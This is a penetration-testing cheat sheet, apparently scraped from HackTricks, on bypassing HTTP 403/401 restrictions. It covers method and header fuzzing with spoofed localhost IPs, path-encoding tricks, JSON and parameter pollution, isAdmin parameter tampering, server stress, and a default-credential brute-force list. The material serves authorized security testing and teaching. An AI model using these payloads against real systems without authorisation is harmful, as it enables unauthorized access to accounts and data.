---
title: "403 & 401 Bypasses"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/403-and-401-bypasses.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## HTTP Verbs/Methods Fuzzing

Try different methods against the same resource: `GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK`. Only use state-changing methods when the assessment scope permits them.[\[3\]](#references)

- Check the response headers, maybe some information can be given. For example, a **200 response** to**HEAD** with`Content-Length: 55` means that the**HEAD verb can access the info** . But you still need to find a way to exfiltrate that info.
- Some frameworks honor headers such as `X-HTTP-Method-Override: PUT` , causing application routing to treat the request as a different method even though the HTTP request line is unchanged.
- Use **`TRACE`** verb and if you are very lucky maybe in the response you can see also the**headers added by intermediate proxies** that might be useful.

## HTTP Headers Fuzzing

-
**Change Host header** to some arbitrary value ([that worked here](https://medium.com/@sechunter/exploiting-admin-panel-like-a-boss-fc2dd2499d31) )<sup>[\[1\]](#references)</sup>
-
Try other User-Agent values from a maintained fuzzing list. <sup>[\[4\]](#references)</sup>
-
**Fuzz HTTP headers** : test proxy-origin headers, a small authorized set of Basic/NTLM credentials, and related routing variations.`fuzzhttpbypass` automates many of these probes.<sup>[\[5\]](#references)</sup>
  - `X-Originating-IP: 127.0.0.1`
  - `X-Forwarded-For: 127.0.0.1`
  - `X-Forwarded: 127.0.0.1`
  - `Forwarded-For: 127.0.0.1`
  - `X-Remote-IP: 127.0.0.1`
  - `X-Remote-Addr: 127.0.0.1`
  - `X-ProxyUser-Ip: 127.0.0.1`
  - `X-Original-URL: 127.0.0.1`
  - `Client-IP: 127.0.0.1`
  - `True-Client-IP: 127.0.0.1`
  - `Cluster-Client-IP: 127.0.0.1`
  - `Host: localhost`
 If the **path is protected** you can try to bypass the path protection using these other headers:
  - `X-Original-URL: /admin/console`
  - `X-Rewrite-URL: /admin/console`
-
If the page is **behind a proxy** , the proxy may be enforcing the restriction while the backend applies different rules. Test[**HTTP Request Smuggling**](../../pentesting-web/http-request-smuggling/index.html) or[**hop-by-hop headers**](../../pentesting-web/abusing-hop-by-hop-headers.html) where authorized.
-
Fuzz [**special HTTP headers**](special-http-headers.html) looking for different response.
  - **Fuzz special HTTP headers** while fuzzing**HTTP Methods** .
-
**Remove the Host header** and maybe you will be able to bypass the protection.

## Path **Fuzzing**

**Fuzzing**

If */path* is blocked:

- Try using `/%2e/path` (if the access is blocked by a proxy, this could bypass the protection). Try also`/%252e**/path` (double URL encode)
- Try **Unicode bypass** :*/**%ef%bc%8f**path* (The URL encoded chars are like “/”) so when encoded back it will be*//path* and maybe you will have already bypassed the*/path* name check
- **Other path bypasses** :
  - `site.com/secret` → HTTP 403 Forbidden
  - `site.com/SECRET` → HTTP 200 OK
  - `site.com/secret/` → HTTP 200 OK
  - `site.com/secret/.` → HTTP 200 OK
  - `site.com//secret//` → HTTP 200 OK
  - `site.com/./secret/..` → HTTP 200 OK
  - `site.com/;/secret` → HTTP 200 OK
  - `site.com/.;/secret` → HTTP 200 OK
  - `site.com//;//secret` → HTTP 200 OK
  - `site.com/secret.json` → HTTP 200 OK (some Ruby routing stacks)
  - Use all [**this list**](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Unicode.txt) in the following situations:
    - /FUZZsecret
    - /FUZZ/secret
    - /secretFUZZ
- **Other API bypasses:**  - /v3/users_data/1234 –> 403 Forbidden
  - /v1/users_data/1234 –> 200 OK
  - `{"id":111}` → 401 Unauthorized
  - `{"id":[111]}` → 200 OK
  - `{"id":{"id":111}}` → 200 OK
  - {“user_id”:“<legit_id>”,“user_id”:“<victims_id>”} (JSON Parameter Pollution)
  - user_id=ATTACKER_ID&user_id=VICTIM_ID (Parameter Pollution)

## **Parameter Manipulation**

**Parameter Manipulation**

- Change **param value** : From**`id=123` –> `id=124`**
- Add additional parameters to the URL: `?`**`id=124` —-> `id=124&isAdmin=true`**
- Remove the parameters
- Re-order parameters
- Use special characters.
- Perform boundary testing in the parameters — provide values like *-234* or*0* or*99999999* (just some example values).

## **Protocol version**

**Protocol version**

If the target uses HTTP/1.1, compare HTTP/1.0 and HTTP/2 behavior. Different front-end/backend protocol handling can expose inconsistent authorization or path normalization.[\[3\]](#references)

## **Other Bypasses**

**Other Bypasses**

- Get the **IP** or**CNAME** of the domain and try**contacting it directly** .
- Try to **stress the server** sending common GET requests ([It worked for this guy wit Facebook](https://medium.com/@amineaboud/story-of-a-weird-vulnerability-i-found-on-facebook-fc0875eb5125) ).<sup>[\[2\]](#references)</sup>
- **Change the protocol** : from http to https, or for https to http
- Go to [**https://archive.org/web/**](https://archive.org/web/) and check if in the past that file was**worldwide accessible** .

## **Brute Force**

**Brute Force**

- **Guess the password** : Test the following common credentials. Do you know something about the victim? Or the CTF challenge name?
- [**Brute force**](../../generic-hacking/brute-force.html#http-brute)**:** Try basic, digest and NTLM auth.

```
admin    admin
admin    password
admin    1234
admin    admin1234
admin    123456
root     toor
test     test
guest    guest
```
## Automatic Tools

## References
